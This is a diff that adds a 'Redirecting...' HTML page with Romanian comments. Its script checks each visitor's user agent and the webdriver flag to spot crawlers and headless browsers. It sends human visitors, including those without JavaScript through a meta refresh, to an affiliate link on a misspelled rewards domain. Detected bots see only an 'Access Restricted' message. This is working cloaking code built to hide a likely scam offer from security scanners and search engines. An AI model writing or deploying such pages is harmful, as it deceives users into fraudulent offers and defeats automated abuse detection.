@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Redirecting...</title>
+  <script>
+    // Detectare boti de bază
+    const isBot = () => {
+      const ua = navigator.userAgent.toLowerCase();
+      const knownBots = ['bot', 'crawl', 'spider', 'slurp', 'fetch', 'headless'];
+      return knownBots.some(bot => ua.includes(bot)) || navigator.webdriver;
+    };
+
+    if (!isBot()) {
+      // Redirecționează utilizatorii reali
+      window.location.href = "https://rewarrdsgiant.com/aff_c?offer_id=2343&aff_id=18811&source=stimulus";
+    } else {
+      // Dacă e bot, afișează doar o pagină goală sau un mesaj
+      document.write("<h1>Access Restricted</h1>");
+    }
+  </script>
+  <noscript>
+    <meta http-equiv="refresh" content="0; url=https://rewarrdsgiant.com/aff_c?offer_id=2343&aff_id=18811&source=stimulus">
+  </noscript>
+</head>
+<body>
+  <p>Redirecting...</p>
+</body>
+</html>
